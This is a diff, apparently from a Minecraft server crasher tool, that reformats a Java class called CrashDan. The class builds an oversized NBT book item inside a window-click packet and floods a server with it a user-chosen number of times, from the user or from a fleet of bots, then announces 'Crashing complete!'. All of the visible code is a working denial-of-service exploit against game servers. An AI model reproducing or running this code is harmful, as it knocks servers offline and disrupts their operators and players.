@@ -18,11 +18,11 @@ import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
 public class CrashDan extends Crash {
-    public CrashDan() {
-        super("dan",CrashType.NBT);
-    }
-
     private Packet packet;
+
+    public CrashDan() {
+        super("dan", CrashType.NBT);
+    }
 
     @SneakyThrows
     @Override
@@ -37,17 +37,17 @@ public class CrashDan extends Crash {
         final NBTTagList pages = new NBTTagList();
         list.forEach(pages::appendTag);
 
-        compound.setTag("pages",pages);
+        compound.setTag("pages", pages);
 
         final ItemStack stack = new ItemStack(138, 1, 0, compound);
 
-        this.packet = new ClientPlayerWindowActionPacket(0,(short)1,0, WindowAction.CLICK_ITEM,1,stack);
+        this.packet = new ClientPlayerWindowActionPacket(0, (short) 1, 0, WindowAction.CLICK_ITEM, 1, stack);
     }
 
     @Override
     public void execute(String message, Player sender) {
 
-        if(packet == null){
+        if (packet == null) {
             sender.sendChatMessage("&cFailed to initialize crash!");
             return;
         }
@@ -56,13 +56,13 @@ public class CrashDan extends Crash {
             final String[] args = message.split(" ");
             final int amount = Integer.parseInt(args[2]);
             if (sender.getBots().size() == 0) {
-                IntStream.range(0,amount).forEach(i -> sender.getConnector().sendPacket(packet));
+                IntStream.range(0, amount).forEach(i -> sender.getConnector().sendPacket(packet));
                 sender.sendChatMessage("&aCrashing complete! &8(&6USER&8)");
             } else {
-                sender.getBots().forEach(b -> IntStream.range(0,amount).forEach(i -> b.getConnection().sendPacket(packet)));
+                sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getConnection().sendPacket(packet)));
                 sender.sendChatMessage("&aCrashing complete! &8(&6BOTS&8)");
             }
-        }catch(final Throwable t){
+        } catch (final Throwable t) {
             sender.sendChatMessage("&cError occured during crashing! &8(&6" + t.getClass().getSimpleName() + "&8)");
         }
     }
